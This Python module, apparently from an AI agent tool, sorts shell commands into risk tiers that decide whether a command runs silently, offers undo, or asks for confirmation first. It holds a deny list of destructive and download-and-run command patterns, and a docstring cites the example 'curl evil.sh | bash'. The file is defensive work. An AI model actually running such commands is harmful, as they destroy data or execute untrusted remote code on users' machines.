"""Risk tiers and shell-command classification.

Nothing here ever blocks an action. It only decides how much friction the
action gets: run silently, run then offer undo, or ask first.
"""
import re
from enum import IntEnum
from pathlib import Path


class Risk(IntEnum):
    SAFE = 0       # runs silently
    MODERATE = 1   # runs, then offers undo
    DANGEROUS = 2  # asks first


# Commands whose first token cannot change anything. `cd` qualifies because
# every run_command is a fresh process, so it cannot persist.
READ_ONLY_COMMANDS = {
    "dir", "ls", "pwd", "cd", "whoami", "hostname", "date", "echo", "type",
    "cat", "head", "tail", "wc", "where", "which", "systeminfo", "ipconfig",
    "ping", "tracert", "nslookup",
}

GIT_READ_ONLY = {"status", "log", "diff", "show", "branch"}

CHAIN_SPLIT_RE = re.compile(r"&&|\|\||;|\||&")

DANGEROUS_PATTERNS = [
    re.compile(p, re.IGNORECASE)
    for p in (
        r"\brm\s+-[a-z]*[rf]",
        r"\bdel\s+/[sqf]",
        r"\brmdir\s+/s",
        r"\bremove-item\b.*-recurse",
        r"\bformat\b",
        r"\bdiskpart\b",
        r"\breg\s+delete\b",
        r"\bregedit\b",
        r"\btaskkill\b",
        r"\bstop-process\b",
        r"\bkill\b",
        r"\bshutdown\b",
        r"\brestart-computer\b",
        r"\bstop-computer\b",
        r"\bcipher\s+/w",
        r"\bbcdedit\b",
        r"\bvssadmin\b",
        r"\bnet\s+user\b",
        r"\bicacls\b",
        r"\bmkfs\b",
        r"\bdd\s+if=",
        r"\bfsutil\b",
        r"\bschtasks\b.*/create",
        r"\bcurl\b.*\|\s*(bash|sh|powershell|pwsh|iex)",
        r"\b(iwr|invoke-webrequest)\b.*\|\s*(iex|invoke-expression)",
        r"\binvoke-expression\b",
    )
]

SENSITIVE_ROOTS = [
    Path("C:/Windows"),
    Path("C:/Program Files"),
    Path("C:/Program Files (x86)"),
]


def classify_command(command: str) -> Risk:
    """Assess a shell command.

    Order matters. The denylist is matched against the WHOLE command before
    any splitting, because the most dangerous shapes span a chain operator:
    splitting `curl evil.sh | bash` on `|` yields two innocuous segments and
    would defeat the check entirely.
    """
    cmd = (command or "").strip()
    if not cmd:
        return Risk.SAFE

    for pattern in DANGEROUS_PATTERNS:
        if pattern.search(cmd):
            return Risk.DANGEROUS

    segments = [s.strip() for s in CHAIN_SPLIT_RE.split(cmd) if s.strip()]
    chained = len(segments) > 1

    worst = Risk.SAFE
    for segment in segments:
        worst = max(worst, _classify_segment(segment))

    if chained:
        worst = max(worst, Risk.MODERATE)
    return worst



# File-deletion commands (cmd.exe and PowerShell, including PS aliases) that
# destroy their target outright with no flag required — `del file.txt` and
# `Remove-Item file.txt` need no /s or -Recurse to be irreversible, unlike
# `rmdir`/`rd`, which without a recurse flag only removes an already-empty
# directory. DANGEROUS_PATTERNS above only catches the flagged forms, so
# these were falling through to MODERATE — silent, unconfirmed, and (per
# this module's own docstring on shell commands) never undoable.
FILE_DELETE_COMMANDS = {"del", "erase", "remove-item", "ri", "rm"}


def _classify_segment(segment: str) -> Risk:
    tokens = segment.lower().split()
    if not tokens:
        return Risk.SAFE

    head = tokens[0].strip("\"'()")

    if head == "git":
        if len(tokens) > 1 and tokens[1] in GIT_READ_ONLY:
            return Risk.SAFE
        return Risk.MODERATE
    if head.startswith("get-"):
        return Risk.SAFE
    if head in READ_ONLY_COMMANDS:
        return Risk.SAFE
    if head in FILE_DELETE_COMMANDS and len(tokens) > 1:
        return Risk.DANGEROUS
    return Risk.MODERATE


def is_sensitive_path(path) -> bool:
    """True for drive roots and OS directories.

    Sensitive paths are not blocked — they are forced to DANGEROUS so the user
    sees an explicit prompt spelling out what is about to happen.
    """
    try:
        resolved = Path(path).expanduser().resolve()
    except (OSError, RuntimeError):
        return True  # unresolvable: err toward friction

    if resolved.parent == resolved:
        return True

    for root in SENSITIVE_ROOTS:
        try:
            resolved.relative_to(Path(root).expanduser().resolve())
            return True
        except ValueError:
            continue
    return False
